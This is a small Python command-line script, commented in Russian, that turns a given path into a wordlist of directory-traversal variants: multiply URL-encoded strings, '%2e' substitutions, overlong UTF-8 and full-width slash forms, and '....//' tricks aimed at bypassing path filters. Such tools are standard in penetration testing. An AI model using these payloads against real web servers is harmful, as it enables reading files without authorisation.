import urllib.parse 
import argparse


# По сути можно сделать два варианта, первый берет на вход только одно слово и его кодирует в список
# Второй вариант - можно передать какой нибудь флаг и бахнуть словарь == ЕГО ПОЗЖЕ реализую

def encode_word_to_url(word: str):
    
    payload = '..'
    variants = []
    # /
    variants.append(payload + '/')                   # .. /
    variants.append(payload + '%c0%af')              # ..%c0%af (overlong)
    variants.append(payload + '%ef%bc%8f')           # ..%ef%bc%8f (full-width)

    # \
    variants.append(payload + '\\')                  # ..\
    variants.append(payload + '%5c')                 # ..%5c
    variants.append(payload + '%c0%5c')              # ..%c0%5c (примерно)
    variants.append(payload + '%ef%bc%bc')           # full-width '\'

    with open("dict_url.txt", "w") as file_output:

        encoded = urllib.parse.quote(word, safe="")
        file_output.write(f"{encoded}\n")
        # Можно будет задать количество итераций !!!

        for i in range(5):
            encoded = urllib.parse.quote(encoded, safe="")
            file_output.write(f"{encoded}\n")
        
        encoded = urllib.parse.quote(word, safe="")
        file_output.write(f"{encoded}\n")

        for i in range(5):
            encoded = urllib.parse.quote(encoded, safe='')
            encoded = "%2e".join(encoded.split(".."))
            
            file_output.write(f"{encoded}\n")


        
        encoded = urllib.parse.quote(encoded, safe="")

        for i in variants:
            output_word = i.join(word.split("../"))
            file_output.write(f"{output_word}\n")


        # Добавление ....//

        output_word = "....//".join(word.split("../"))
        file_output.write(f"{output_word}\n")

        # Добавление ..\/

        output_word = "..\\/".join(word.split("../"))
        file_output.write(f"{output_word}\n")

    # print(encoded)
    # print()

def main():
    parser = argparse.ArgumentParser(
        prog='encodeURL',
        description='Script create dict with url obfuscation',
        epilog='Write path url'
        )
    
    parser.add_argument('-u', type=str, help='Enter your string, url')
    args = parser.parse_args()

    encode_word_to_url(args.u)


if __name__ == "__main__":
    
    
    print("Start encode")

    main()